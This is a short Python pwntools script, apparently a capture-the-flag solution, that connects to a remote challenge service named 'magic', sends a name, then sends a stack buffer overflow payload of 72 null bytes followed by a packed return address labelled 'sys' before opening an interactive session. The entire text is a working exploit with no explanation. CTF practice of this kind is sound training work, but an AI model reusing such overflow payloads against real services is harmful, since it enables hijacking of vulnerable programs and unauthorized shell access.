from pwn import*
io=remote("bamboofox.cs.nctu.edu.tw", 10000)
#io=process('./magic')
io.recvuntil('name(a-z):')
io.send('lhh\n')
io.recvuntil(' MAGIC:')
sys=0x0804860e
payload="\x00"*72+p32(sys)
io.send(payload)
io.interactive()




